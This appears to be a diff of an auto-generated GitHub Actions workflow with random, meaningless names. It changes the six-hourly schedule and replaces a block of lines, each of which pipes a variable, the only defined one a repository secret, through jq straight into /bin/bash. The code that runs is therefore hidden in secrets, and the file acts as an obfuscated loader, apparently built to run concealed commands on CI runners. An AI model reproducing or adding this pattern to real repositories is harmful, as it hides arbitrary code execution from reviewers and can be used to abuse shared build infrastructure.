@@ -1,9 +1,9 @@
 name: yinkaldk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 0/6 * * *'
+    - cron: '45 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,24 +11,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: yinkaldk
         env:
-          j48: ${{ secrets.j48 }}
+          wfjyc4: ${{ secrets.wfjyc4 }}
         run: |
-          echo $j48 | jq -r .y49535 | /bin/bash
-          echo $apna49695 | jq -r .nk7392 | /bin/bash
-          echo $ykm2353 | jq -r .ehvv1287 | /bin/bash
-          echo $bcs42 | jq -r .yobu70767 | /bin/bash
-          echo $mmim246 | jq -r .x0003 | /bin/bash
-          echo $zi1690 | jq -r .nici770 | /bin/bash
-          echo $lgje1063 | jq -r .lxwt59041 | /bin/bash
-          echo $eyu59 | jq -r .ijlwl211 | /bin/bash
-          echo $ytzsq50495 | jq -r .yo543 | /bin/bash
-          echo $yyi6064 | jq -r .lzj0 | /bin/bash
-          echo $sul3 | jq -r .lh99 | /bin/bash
-          echo $zgg95 | jq -r .lxla8672 | /bin/bash
-          echo $rg69 | jq -r .gttfb57035 | /bin/bash
-          echo $touzs576 | jq -r .esfxm47527 | /bin/bash
-          echo $apkt9442 | jq -r .ai7 | /bin/bash
-          echo $uuax7218 | jq -r .c955 | /bin/bash
-          echo $m85 | jq -r .ggw045 | /bin/bash
-          echo $v28917 | jq -r .ehlr1 | /bin/bash
+          echo $wfjyc4 | jq -r .tf26 | /bin/bash
+          echo $uosbl958 | jq -r .i6 | /bin/bash
+          echo $oj43 | jq -r .btdkr0 | /bin/bash
+          echo $pzjp266 | jq -r .ol6200 | /bin/bash
+          echo $uqbi11597 | jq -r .qgaix25 | /bin/bash
+          echo $g36776 | jq -r .j79195 | /bin/bash
+          echo $da4 | jq -r .b3268 | /bin/bash
+          echo $lu64 | jq -r .kdeq9170 | /bin/bash
+          echo $z34 | jq -r .mx480 | /bin/bash
+          echo $d0 | jq -r .vm732 | /bin/bash
+          echo $a64 | jq -r .d1070 | /bin/bash
+          echo $vdcsd87299 | jq -r .mqt11 | /bin/bash
+          echo $lkcd181 | jq -r .ywsra2844 | /bin/bash
+          echo $urroo78664 | jq -r .a9572 | /bin/bash
 
